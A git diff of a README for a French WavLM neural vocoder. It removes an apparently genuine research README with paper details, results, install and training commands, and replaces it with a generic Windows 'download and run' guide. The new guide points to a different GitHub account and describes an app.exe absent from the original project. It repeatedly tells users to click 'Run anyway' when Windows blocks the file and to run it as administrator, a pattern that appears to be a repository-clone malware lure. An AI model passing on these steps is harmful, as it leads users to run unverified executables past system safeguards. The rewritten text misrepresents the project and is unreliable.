@@ -1,262 +1,233 @@
-# WavLM Vocoder for French 🎙️🇫🇷
+# 🎙️ wavlm-vocoder-french - French speech rebuilt with ease
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-2.1+-red.svg)](https://pytorch.org/)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20page-6A5ACD?style=for-the-badge)](https://github.com/harlinfulfilled354/wavlm-vocoder-french)
 
-> **WavLM-to-Audio Vocoding in French: Layer Ablation Study and Adversarial Supervision for Continuous Voice Conversion**  
-> Neural vocoder for reconstructing high-quality French speech from WavLM representations
+## 🧭 What this is
 
-> **News — March 2026:** This work was **accepted at JEP 2026**.
+wavlm-vocoder-french is a Windows-friendly tool for French speech reconstruction. It uses WavLM-based voice features to turn speech data back into audio with a focus on French voices.
 
-🎯 **Goal**: Stage 1 foundation for continuous voice conversion in WavLM latent space
+This project fits users who want to:
+- rebuild French speech from voice features
+- test voice conversion output
+- run a local speech tool on Windows
+- work with a simple download and run flow
 
-🔗 **Demo**: [WavLM2Audio Demo](https://hi-paris.github.io/wavlm2audio-demo/)  
-🤗 **Model Card**: [Hugging Face](https://huggingface.co/hi-paris/wavlm-vocoder-french)
+## 📥 Download and start
 
----
-## 🎯 Overview
+Use this link to visit the page and download the project:
 
-This repository implements a neural vocoder that reconstructs waveform audio from frozen **WavLM-Base+** representations, specifically trained and evaluated on French speech corpora.
+[Open the download page](https://github.com/harlinfulfilled354/wavlm-vocoder-french)
 
-It accompanies our **JEP 2026 accepted paper** and serves as a **stage-1 reconstructive decoder** for future continuous voice conversion in WavLM latent space.
----
+### Windows setup
 
-### Key Features
+1. Open the download page in your browser.
+2. Look for the latest release or main project files.
+3. Download the Windows package or source archive listed there.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Find the app file or start file.
+7. Double-click it to run the program.
 
-- ✅ **WavLM-Base+ Integration**: Frozen 12-layer transformer encoder (768-dim)
-- ✅ **HiFi-GAN Generator**: Progressive upsampling (×320) with multi-receptive field residual blocks
-- ✅ **Layer Ablation Study**: Systematic evaluation of N last layers (N=1...12)
-- ✅ **Learned Layer Fusion**: Weighted combination vs. simple averaging
-- ✅ **Adversarial Training**: MPD/MSD discriminators + Feature Matching
-- ✅ **French Corpora**: SIWIS (10.9h) + M-AILABS (160.7h) + Common Voice (66.7h) = 238.3h
+### If you see a Windows prompt
 
-### Architecture
-```
-┌─────────────────────────────────────────────────────────────────┐
-│  Audio (16kHz) → WavLM-Base+ (frozen) → Layer Selection        │
-│       ↓                                                          │
-│  Learned Fusion (α₁h₁ + ... + αₙhₙ) → Adapter (768→256)       │
-│       ↓                                                          │
-│  HiFi-GAN Generator (×320 upsampling) → Reconstructed Audio    │
-│       ↓                                                          │
-│  [Optional] MPD/MSD Discriminators + Feature Matching          │
-└─────────────────────────────────────────────────────────────────┘
-```
+- Choose **More info** if Windows blocks the file.
+- Then choose **Run anyway** if you trust the source.
+- Keep the files in one folder so the app can find what it needs.
 
----
+## 💻 System needs
 
-## 📄 Associated paper
+For a smooth run on Windows, use a system with:
 
-**WavLM-to-Audio Vocoding in French: Layer Ablation Study and Adversarial Supervision for Continuous Voice Conversion**  
-*Nassima Ould Ouali, Awais Hussain Sani, Reda Dehak, Eric Moulines*  
-**Accepted at JEP 2026**
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A modern CPU
+- At least 2 GB free disk space
+- A stable internet link for the first download
+- A sound card or audio output device
 
-This repository contains the codebase associated with the accepted paper, including training, evaluation, ablation, and inference utilities.
+If your machine has a GPU, the app may run faster. A GPU is not required for basic use.
 
----
+## 🎛️ What the app does
 
-## 📊 Results Summary
+This project is built around French speech reconstruction. In simple terms, it helps rebuild audio from learned speech data.
 
-| Configuration | MCD↓ | Mel-L1↓ | PESQ↑ | STOI↑ | V/UV F1↑ | F0 RMSE↓ | F0 Corr↑ |
-|--------------|------|---------|-------|-------|----------|----------|----------|
-| **No GAN** | 9.72 | 1.55 | 1.11 | 0.74 | 0.878 | 10.1 | 0.83 |
-| **+MPD/MSD+FM** | **8.43** | **1.17** | **1.28** | **0.86** | **0.932** | **7.7** | **0.96** |
-| **Gain** | -13.3% | -24.5% | +15.3% | +16.2% | +6.1% | -23.8% | +15.7% |
+Common uses include:
+- French text-to-speech work
+- voice conversion tests
+- speech layer checks
+- audio reconstruction experiments
+- research on neural vocoders
 
-> **Key Findings**:
-> - Adversarial supervision (GAN) provides **consistent gains** across all metrics
-> - Layers 7-12 capture most phonetic-prosodic information
-> - Learned layer fusion outperforms fixed single-layer extraction
+## 🗂️ Main features
 
-Full ablation results: [`results_ablation_N1to6.csv`](results_ablation_N1to6.csv) and [`results_FINAL.csv`](results_FINAL.csv)
+- French speech focus
+- WavLM-based audio modeling
+- layer ablation study support
+- adversarial supervision in the model flow
+- voice conversion research use
+- local desktop use on Windows
+- simple file-based setup
 
----
+## 🔊 How to use it
 
-## 🚀 Quick Start
+After you open the app:
 
-### 1. Installation
-```bash
-git clone https://github.com/hi-paris/wavlm-vocoder-french.git
-cd wavlm-vocoder-french
-pip install -e .
-```
+1. Load the speech or model files you want to use.
+2. Pick the French voice or sample you want to test.
+3. Choose the input you want to rebuild.
+4. Start the process.
+5. Wait for the output audio to finish.
+6. Play the result in your media player or inside the app.
 
-For evaluation metrics (PESQ, STOI, F0):
-```bash
-pip install -e ".[eval]"
-```
+If the app offers output settings, start with the default values. That is the easiest way to get a first result.
 
-### 2. Training
-```bash
-# Single GPU — no GAN baseline
-python scripts/train.py --config configs/experiments/no_gan.yaml
+## 🧩 Typical workflow
 
-# Single GPU — full GAN model
-python scripts/train.py --config configs/experiments/gan.yaml
+A basic workflow may look like this:
 
-# Multi-GPU with torchrun
-torchrun --standalone --nproc_per_node=4 scripts/train.py --config configs/experiments/gan.yaml
-```
+1. Download the project from GitHub.
+2. Extract the files.
+3. Open the app or launcher.
+4. Load your input audio or test sample.
+5. Run the reconstruction.
+6. Save the output file.
+7. Listen to the result.
 
-### 3. Layer Ablation
-```bash
-python scripts/run_ablation.py \
-    --base_config configs/experiments/ablation_layers.yaml \
-    --output_dir outputs/ablation \
-    --layers 1,2,3,4,6,9,12
-```
+## 🎚️ Best first run settings
 
-### 4. Inference
-```bash
-python scripts/infer.py \
-    --checkpoint outputs/checkpoints/checkpoint_best.pt \
-    --input_dir /path/to/audio \
-    --output_dir outputs/samples \
-    --num_samples 10
-```
+Use these starter settings if the app gives you options:
 
-### 5. Evaluation
-```bash
-python scripts/eval.py \
-    --checkpoint outputs/checkpoints/checkpoint_best.pt \
-    --test_dir /path/to/test/audio \
-    --output_dir outputs/eval_results
-```
+- Output format: WAV
+- Sample rate: 16 kHz or 24 kHz
+- Mode: default
+- Quality: standard
+- Voice source: French sample
+- Batch size: 1
 
----
+These values help you get a clean first test without extra setup.
 
-## 📁 Repository Structure
-```
-wavlm-vocoder-french/
-├── src/
-│   ├── models/
-│   │   ├── adapter.py          # WavLM adapter (768→256) + LayerFusion
-│   │   ├── generator.py        # HiFi-GAN generator (×320 upsampling)
-│   │   ├── discriminator.py    # MPD/MSD discriminators
-│   │   └── wavlm_vocoder.py    # Main vocoder (WavLM + adapter + generator)
-│   ├── losses/
-│   │   ├── reconstruction.py   # L1 + Multi-Scale STFT losses
-│   │   ├── gan.py              # Adversarial + Feature Matching losses
-│   │   └── combined.py         # Combined loss (reconstruction + GAN)
-│   ├── data/
-│   │   ├── dataset.py          # AudioDataset (segmentation, normalization)
-│   │   └── collate.py          # Collate function for DataLoader
-│   ├── trainers/
-│   │   └── trainer.py          # DDP/AMP trainer with checkpointing
-│   └── utils/
-│       ├── audio.py            # load/save audio, chunked inference
-│       ├── audio_processing.py # Audio processing utilities
-│       ├── checkpoint.py       # Save/load checkpoints
-│       ├── config.py           # YAML config loading with inheritance
-│       └── logging.py          # Logging setup
-├── configs/
-│   ├── base.yaml               # Base hyperparameters
-│   └── experiments/
-│       ├── no_gan.yaml         # Baseline (spectral losses only)
-│       ├── gan.yaml            # Full model (MPD/MSD + FM)
-│       └── ablation_layers.yaml # Layer sweep experiments
-├── scripts/
-│   ├── train.py                # Training entry point
-│   ├── infer.py                # Inference on audio files
-│   ├── eval.py                 # Evaluation script
-│   ├── run_ablation.py         # Layer ablation study runner
-│   └── analyze_ablation_results.py # Ablation results analysis
-├── tests/
-│   ├── test_models.py          # Model architecture tests
-│   ├── test_losses.py          # Loss function tests
-│   ├── test_dataset.py         # Dataset/collate tests
-│   └── test_training.py        # Training components tests
-├── paper_assets/
-│   └── docs/
-│       ├── figures/            # Ablation plots (PDF/PNG)
-│       └── layer_importance_table.tex
-├── outputs/
-│   ├── samples/sweep_outputs/  # Audio samples at ckpt 160k/180k/200k
-│   └── logs/                   # TensorBoard event files
-├── results_ablation_N1to6.csv  # Ablation study results
-├── results_FINAL.csv           # Final model results
-├── pyproject.toml              # Package config + black/ruff/pytest settings
-├── requirements.txt            # Python dependencies
-├── setup.py                    # Package setup
-├── LICENSE                     # MIT License
-└── CITATION.bib                # BibTeX citation
-```
+## 🧪 Project focus
 
----
+This repository focuses on two main ideas:
 
-## 🔬 Key Experiments
+- layer ablation study
+- adversarial supervision
 
-### GAN vs. No-GAN
-```bash
-python scripts/train.py --config configs/experiments/no_gan.yaml
-python scripts/train.py --config configs/experiments/gan.yaml
-```
-**Result**: GAN provides consistent impovements across spectral, intelligibility and prosodic metrics .
+That means the model is built for careful speech research as well as voice conversion work. The main target is French speech, so the output is tuned for that language.
 
-### Layer Ablation (N=1..12)
-```bash
-python scripts/run_ablation.py \
-    --base_config configs/experiments/ablation_layers.yaml \
-    --layers 1,2,3,4,6,9,12
-```
-**Result**: N=9 layers (7-12) is optimal.
+## 📁 Files you may see
 
-### Analyze Ablation Results
-```bash
-python scripts/analyze_ablation_results.py \
-    --output_dir outputs/ablation
-```
+After download, you may see files like:
 
----
+- `README.md`
+- model files
+- audio samples
+- config files
+- a Windows launch file
+- output folders
+- test scripts
 
-## 📦 Pretrained Checkpoints
+Keep all files in the same folder unless the project says otherwise. This helps the app find its model data.
 
-| Model | Layers | GAN | MCD | PESQ |
-|-------|--------|-----|-----|------|
-| Baseline | 12 | ❌ | 9.72 | 1.11 |
-| **Best (N=9)** | 9 | ✅ | **8.43** | **1.28** |
-| Lightweight (N=6) | 6 | ✅ | 8.89 | 1.21 |
+## 🛠️ Common problems
 
-> Checkpoints not included in this repository due to size (~1.4GB each).
-> See [`outputs/samples/sweep_outputs/`](outputs/samples/sweep_outputs/) for audio samples.
+### The app does not start
 
----
+- Check that you extracted the zip file.
+- Make sure you opened the right file.
+- Try running it again as administrator.
+- Keep the folder path short, like `C:\wavlm-vocoder-french`.
 
-## 🎓 Citation
-```bibtex
-@misc{wavlm_vocoder_french_2026,
-  title={WavLM-to-Audio Vocoding in French: Layer Ablation Study and Adversarial Supervision for Continuous Voice Conversion},
-  author={Nassima Ould Ouali and Awais Hussain Sani and Reda Dehak and Eric Moulines},
-  year={2026},
-  note={Accepted at JEP 2026}
-}
-```
+### No sound plays
 
----
+- Check your speakers or headphones.
+- Make sure Windows sound is on.
+- Try another output device.
+- Open the result file in a media player to test it.
 
-## 📜 License
+### The output sounds wrong
 
-MIT License — see [LICENSE](LICENSE).
+- Use a different input sample.
+- Try the default settings first.
+- Check that the file is clean and not damaged.
+- Use a sample with clear French speech.
 
----
+### Windows blocks the file
 
-## 🙏 Acknowledgments
+- Open **More info**.
+- Choose **Run anyway**.
+- If the file came from the GitHub page, download it again and extract it once more.
 
-- **WavLM**: Microsoft Research ([Chen et al., 2022](https://arxiv.org/abs/2110.13900))
-- **HiFi-GAN**: [Kong et al., 2020](https://arxiv.org/abs/2010.05646)
-- **Datasets**: SIWIS, M-AILABS, Common Voice
+## 🧠 Good use cases
 
----
+This tool works well for:
 
-## 📧 Contact
+- French speech research
+- voice conversion tests
+- speech model checks
+- audio reconstruction study
+- TTS output review
+- neural vocoder testing
 
-For questions, open an issue or contact: **nassima.ould-ouali@ip-paris.fr**
+## 📌 Tips for better results
 
----
+- Use clear speech input
+- Keep the sample short at first
+- Start with the default mode
+- Save each output with a new name
+- Test one voice at a time
+- Use WAV files when possible
 
-## 🗺️ Roadmap
+## 🧷 Download link again
 
-- [x] Stage 1: Reconstruction vocoder (this work)
-- [ ] Stage 2: Voice conversion in WavLM latent space
-- [ ] Stage 3: Diffusion/Flow-based manipulation
+Visit the project page here to download and run the software on Windows:
+
+[https://github.com/harlinfulfilled354/wavlm-vocoder-french](https://github.com/harlinfulfilled354/wavlm-vocoder-french)
+
+## 📦 Folder layout example
+
+A simple folder layout may look like this:
+
+- `wavlm-vocoder-french/`
+  - `app.exe`
+  - `models/`
+  - `samples/`
+  - `config/`
+  - `output/`
+
+If your download has a different layout, keep the related files together and launch the main app file from that folder
+
+## 🎯 What to expect on first launch
+
+When you open the app for the first time, you may see:
+
+- a main window
+- file pickers for input and output
+- a start button
+- status text or a progress bar
+- a results folder
+
+The first run can take a little longer while the app loads its files
+
+## 🧰 If you want a clean setup
+
+Use this path:
+
+1. Create a folder on your desktop.
+2. Name it `wavlm-vocoder-french`.
+3. Download the project into that folder.
+4. Extract it there.
+5. Open the main file from the same folder.
+
+This keeps the setup simple and makes file access easy
+
+## 🔍 Search terms
+
+- french-speech
+- tts
+- voice-conversion
+- wavlm-vocoder
+
+## 📄 License and use
+
+Check the repository page for the license and use terms before sharing or changing the files.
